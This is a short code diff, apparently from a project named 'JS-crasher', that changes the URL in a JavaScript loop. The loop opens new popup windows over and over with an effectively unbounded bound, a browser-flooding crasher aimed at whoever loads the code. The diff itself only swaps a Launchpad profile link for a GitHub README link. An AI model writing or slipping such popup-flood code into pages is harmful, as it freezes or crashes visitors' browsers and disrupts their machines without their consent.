@@ -1,3 +1,3 @@
 for (let i = 0; i < 999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999n; i++) {
-  window.open("https://launchpad.net/~zigthepig7", "_blank", "width=300,height=200");
+  window.open("https://github.com/zigthepig7/JS-crasher/blob/main/README.md", "_blank", "width=300,height=200");
 }
